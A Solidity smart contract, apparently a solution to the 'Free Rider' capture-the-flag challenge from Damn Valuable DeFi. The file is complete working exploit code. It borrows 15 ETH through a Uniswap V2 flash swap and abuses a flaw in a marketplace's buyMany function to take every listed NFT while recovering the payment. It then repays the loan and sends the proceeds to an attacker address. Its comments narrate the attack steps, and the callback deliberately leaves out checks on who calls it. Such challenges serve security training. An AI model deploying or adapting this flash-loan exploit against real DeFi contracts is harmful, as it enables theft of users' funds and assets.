// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FreeRiderNFTMarketplace.sol";
import "../DamnValuableNFT.sol";

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

//WETH9.sol only compiles with sol^0.7.0 so add minimalisitc interface here
interface WETH {
    function balanceOf(address _owner) external view returns (uint256 balance);
    function transfer(address _to, uint256 _value) external returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool success);
    function approve(address _spender, uint256 _value) external returns (bool success);
    function deposit() external payable;
    function withdraw(uint wad) external;
}


contract FreeRiderExploit is IERC721Receiver{

    using Address for address payable;

    uint256[] public tokenIdsToBuy;
    WETH public immutable wethToken;
    IERC721 public immutable nft;
    address public attacker;
    address public uniswapPairExchangeAddress;
    FreeRiderNFTMarketplace public freeRiderNFTMarketplace;
    address public buyerAddress;


    constructor (uint256[] memory tokenIds, address wethAddress, address payable marketPlaceAddress, address _attacker, address _uniswapPairExchangeAddress, address _nft, address _buyerAddress) {
        tokenIdsToBuy = tokenIds;
        wethToken = WETH(wethAddress);
        attacker = _attacker;
        uniswapPairExchangeAddress = _uniswapPairExchangeAddress;
        freeRiderNFTMarketplace = FreeRiderNFTMarketplace(marketPlaceAddress);
        nft = IERC721(_nft);
        buyerAddress = _buyerAddress;
    }


    //Payable so I can cover the fees from the UniswapV2 flash-swap
    function pwn() public payable {

        //Encode something in the data field so we trigger flash-swap
        bytes memory data = abi.encode(15 ether);
        
        //Call flash-swap to get 15 ETH
        bytes memory encodedData = abi.encodeWithSignature("swap(uint256,uint256,address,bytes)", 15 ether, 0, address(this), data);
        (bool success,) = uniswapPairExchangeAddress.call(encodedData);
        require(success, "Couldnt successfully complete flash-swap!");

        //Done executing flash-swap, now we own all the NFTs        
        //Transfer NFTs to buyer-contract
        for (uint i = 0; i < tokenIdsToBuy.length; i++) {  //for loop example
            nft.safeTransferFrom(address(this), buyerAddress, tokenIdsToBuy[i]);  
        }
        require(address(this).balance > 45 ether, "For some reason didnt get the 45 ether from buyer!");
        
        //Return money to attacker
        payable(attacker).sendValue(address(this).balance);
    }


    function uniswapV2Call(address, uint, uint, bytes calldata data) external {
        //I could do some sophisticated checking that the swap happened with the correct pair and correct amount, but I could also make myself another coffee in that time :^)
        
        //Unnecessarily extracting amount from data field, but had to put something in the data field in order to trigger flash swap anyways        
        uint amount = abi.decode(data, (uint));

        require(wethToken.balanceOf(address(this)) >= 15 ether, "Not enough WETH for buying NFT");        
        wethToken.withdraw(15 ether);
        
        //Due to the flawed implementation, I can buy all NFTs at once and still get the money back
        freeRiderNFTMarketplace.buyMany{value: 15 ether}(tokenIdsToBuy);

        //Source: https://dev.to/uv-labs/executing-flash-swaps-on-uniswap-6ch
        uint fee = ((amount * 3) / 997) + 1;
        uint amountToRepay = amount + fee;

        //Pay back the necessary amount in WETH
        wethToken.deposit{value: amountToRepay}();
        wethToken.transfer(msg.sender, amountToRepay); // return WETH to V2 pair  
    }


    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }


    receive() external payable{}
}